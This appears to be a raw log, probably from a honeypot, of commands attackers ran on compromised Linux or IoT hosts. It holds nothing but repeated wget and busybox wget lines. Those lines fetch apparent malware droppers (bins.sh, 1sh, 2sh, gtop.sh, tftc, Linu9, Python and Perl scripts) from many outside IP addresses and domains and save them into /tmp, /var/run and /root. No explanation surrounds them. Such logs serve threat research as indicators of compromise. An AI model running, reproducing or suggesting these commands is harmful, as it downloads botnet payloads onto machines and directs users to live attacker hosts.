wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -qO - http://104.236.84.211/x/1sh
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -qO - http://104.236.84.211/x/1sh
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -c http://104.236.84.211/x/2sh -P /tmp
wget  -c http://104.236.84.211/x/1sh -P /var/run
wget  -qO /root/- http://104.236.84.211/x/2sh
wget  -qO - http://104.236.84.211/x/1sh
busybox  wget -q http://23.94.97.5/gtop.sh
wget -q http://23.94.97.5/gtop.sh
wget  http://89.163.140.245/bins.sh
wget  http://89.163.140.245/bins.sh
busybox  wget -q http://23.94.97.5/gtop.sh
wget -q http://23.94.97.5/gtop.sh
busybox  wget -q http://23.94.97.5/gtop.sh
wget -q http://23.94.97.5/gtop.sh
busybox  wget -q http://23.94.97.5/gtop.sh
wget -q http://23.94.97.5/gtop.sh
wget  http://ssquad.net23.net//test.py
wget  -qO - http://84.104.109.233/x/2sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
busybox  wget http://23.228.81.116:280/123.txt
wget http://23.228.81.116:280/123.txt
busybox  wget http://23.228.81.116:280/123.txt
wget http://23.228.81.116:280/123.txt
busybox  wget http://23.228.81.116:280/123.txt
wget http://23.228.81.116:280/123.txt
busybox  wget http://23.228.81.116:280/123.txt
wget http://23.228.81.116:280/123.txt
busybox  wget http://23.228.81.116:280/123.txt
wget http://23.228.81.116:280/123.txt
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO - http://84.104.109.233/x/1sh
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO - http://84.104.109.233/x/1sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO - http://84.104.109.233/x/1sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO - http://84.104.109.233/x/1sh
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  http://5.206.225.72/bins.sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -qO - http://84.104.109.233/x/1sh
wget  werwolf.3x.ro/test.py
wget  www.werwolf.3x.ro/test
wget  mexicanudemitza.3x.ro/bomba.zip
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO - http://84.104.109.233/x/1sh
wget  pantera.comule.com/p.pl
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -qO - http://84.104.109.233/x/1sh
wget  http://5.206.225.72/bins.sh
wget  http://5.206.225.72/bins.sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO - http://84.104.109.233/x/1sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  insanezor.16mb.com/viteza.py
busybox  wget http://23.228.81.116:280/123.txt
wget http://23.228.81.116:280/123.txt
busybox  wget http://23.228.81.116:280/123.txt
wget http://23.228.81.116:280/123.txt
busybox  wget http://23.228.81.116:280/123.txt
wget http://23.228.81.116:280/123.txt
busybox  wget http://23.228.81.116:280/123.txt
wget http://23.228.81.116:280/123.txt
busybox  wget http://23.228.81.116:280/123.txt
wget http://23.228.81.116:280/123.txt
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO - http://84.104.109.233/x/1sh
wget  http://94.102.56.200/bins.sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO - http://84.104.109.233/x/1sh
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO - http://84.104.109.233/x/1sh
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
busybox  wget http://23.228.81.116:280/123.txt
wget http://23.228.81.116:280/123.txt
busybox  wget http://23.228.81.116:280/123.txt
wget http://23.228.81.116:280/123.txt
busybox  wget http://23.228.81.116:280/123.txt
wget http://23.228.81.116:280/123.txt
busybox  wget http://23.228.81.116:280/123.txt
wget http://23.228.81.116:280/123.txt
busybox  wget http://23.228.81.116:280/123.txt
wget http://23.228.81.116:280/123.txt
busybox  wget http://23.228.81.116:280/123.txt
wget http://23.228.81.116:280/123.txt
busybox  wget http://23.228.81.116:280/123.txt
wget http://23.228.81.116:280/123.txt
busybox  wget http://23.228.81.116:280/123.txt
wget http://23.228.81.116:280/123.txt
busybox  wget http://23.228.81.116:280/123.txt
wget http://23.228.81.116:280/123.txt
busybox  wget http://23.228.81.116:280/123.txt
wget http://23.228.81.116:280/123.txt
wget  insanezor.16mb.com/viteza.py
wget  -c http://222.186.58.197:15471/tftc
wget  -c http://222.186.58.197:15471/tftc
wget  -c http://222.186.58.197:15471/tftc
wget  -c http://222.186.58.197:15471/tftc
wget  -c http://222.186.58.197:15471/tftc
wget  -c http://222.186.58.197:15471/tftc
wget  -c http://222.186.58.197:15471/tftc
wget  -c http://222.186.58.197:15471/tftc
wget  http://185.112.157.127/bins.sh
wget  http://185.112.157.127/bins.sh
wget  http://185.112.157.127/bins.sh
wget  -c http://222.186.58.197:15471/tftc
wget  http://185.112.157.127/bins.sh
wget  -c http://222.186.58.197:15471/tftc
wget  http://185.112.157.127/bins.sh
wget  -c http://222.186.58.197:15471/tftc
wget  -c http://222.186.58.197:15471/tftc
wget  -c http://222.186.58.197:15471/tftc
wget  http://185.112.157.127/bins.sh
wget  -c http://222.186.58.197:15471/tftc
wget  -c http://222.186.58.197:15471/tftc
wget  -c http://222.186.58.197:15471/tftc
busybox  wget http://185.128.40.236/bins.sh
wget http://185.128.40.236/bins.sh
busybox  wget http://185.128.40.236/bins.sh
wget http://185.128.40.236/bins.sh
busybox  wget http://185.128.40.236/bins.sh
wget http://185.128.40.236/bins.sh
wget  -c http://222.186.58.197:15471/udxx
wget  -c http://222.186.58.197:15471/udxx
wget  -c http://222.186.58.79:7781/Linu9
wget  -c http://222.186.58.79:7781/Linu9
wget  dng.netau.net/stuff/test.py
busybox  wget http://23.228.81.116:280/123.txt
wget http://23.228.81.116:280/123.txt
busybox  wget http://23.228.81.116:280/123.txt
